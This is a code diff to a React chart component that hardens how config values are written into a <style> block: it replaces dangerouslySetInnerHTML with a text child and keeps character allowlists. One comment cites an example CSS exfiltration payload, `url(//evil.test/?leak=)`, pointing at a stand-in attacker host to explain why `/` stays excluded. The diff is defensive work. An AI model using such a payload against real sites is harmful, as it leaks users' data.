@@ -22,9 +22,9 @@ type ChartContextProps = {
 
 const ChartContext = React.createContext<ChartContextProps | null>(null);
 
-// ChartStyle writes these into a <style> block, so a value carrying `;`, `}` or
-// `</style>` would escape its declaration. Config keys are not always literals —
-// the tag aggregation panel builds them from user-supplied eval tag names.
+// ChartStyle writes these into a <style> block, so a value carrying `;` or `}`
+// would escape its declaration. Config keys are not always literals — the tag
+// aggregation panel builds them from user-supplied eval tag names.
 const CSS_IDENT = /^[A-Za-z0-9_-]+$/;
 // `/` and `*` are excluded and MUST STAY excluded. Without `/` the charset
 // still admits `url(//evil.test/?leak=)`: a protocol-relative URL needs no `:`
@@ -125,12 +125,9 @@ const ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {
     return null;
   }
 
-  return (
-    <style
-      dangerouslySetInnerHTML={{
-        __html: Object.entries(THEMES)
-          .map(
-            ([theme, prefix]) => `
+  const css = Object.entries(THEMES)
+    .map(
+      ([theme, prefix]) => `
 ${prefix} [data-chart=${id}] {
 ${colorConfig
   .map(([key, itemConfig]) => {
@@ -147,11 +144,14 @@ ${colorConfig
   .join("\n")}
 }
 `,
-          )
-          .join("\n"),
-      }}
-    />
-  );
+    )
+    .join("\n");
+
+  // Rendered as a text child, not dangerouslySetInnerHTML: the browser parses
+  // a <style> element's text content as CSS either way, and a text node cannot
+  // introduce markup. The CSS_IDENT / CSS_COLOR allowlists above are still what
+  // keeps a value from escaping its own declaration.
+  return <style>{css}</style>;
 };
 
 const ChartTooltip = RechartsPrimitive.Tooltip;
